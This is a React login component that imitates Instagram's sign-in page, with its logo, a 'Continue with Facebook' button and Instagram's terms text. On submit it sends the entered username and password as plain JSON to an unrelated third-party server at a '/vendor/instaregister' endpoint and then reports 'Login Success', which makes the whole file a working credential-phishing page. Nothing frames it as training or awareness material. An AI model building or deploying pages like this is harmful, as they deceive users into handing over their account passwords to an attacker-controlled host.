import React, { useState } from "react";
import "./InstagramLogin.css";
import image from '../assets/fb1.png';

const InstagramLogin = () => {
    const [email,setEmail] = useState("")
    const [password,setPassword] = useState("")
    const [msg,setMsg] = useState("")
    const [loading,setLoading]=useState(false);
    const API_PATH="https://backend-nodejs-swiggy-jbpj.onrender.com";

 const handleSubmit = async (e) =>{
   e.preventDefault();
   try{
    setLoading(true);
    setMsg("");
    const response = await fetch(`${API_PATH}/vendor/instaregister`,{
      method:'POST',
      headers:{
        'Content-Type':'application/json'
      },
      body:JSON.stringify({email,password})
    });
    if(response.ok){
        setMsg("Login Success")
        setLoading(false)
    }
   }catch(err){
       console.error("registration", err);
       alert("login failed")
   }
  }
  return (
    <div className="insta-wrapper">
      <div className="insta-container">
         <h3>{msg}</h3>
        <h1 className="insta-logo">Instagram</h1>
        <button className="facebook-button">
          <img
            src={image}
            alt="fb"
            className="fb-icon"
          />
          Continue with Facebook
        </button>
       <form onSubmit={handleSubmit}>
        <div className="separator">
          <div className="line"></div>
          <span>OR</span>
          <div className="line"></div>
        </div>

        <input
          className="input-field"
          type="text"
          name='email' value={email} onChange={(e)=>setEmail(e.target.value)}
          placeholder="Phone number, username, or email"
        />
        <input
          className="input-field"
          type="password"
          name='password' value={password} onChange={(e)=>setPassword(e.target.value)}
          placeholder="Password"
        />

        <a href="#" className="forgot-link">
          Forgot password?
        </a>

        <button className="login-button" type="submit">{loading? "Log in...": "Log in"}</button>
        </form>

        <div className="signup-link">
          Don't have an account? <a href="#">Sign up</a>
        </div>

        <p className="terms">
          By continuing, you agree to Instagram's{" "}
          <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
        </p>
      </div>
    </div>
  );
};

export default InstagramLogin;
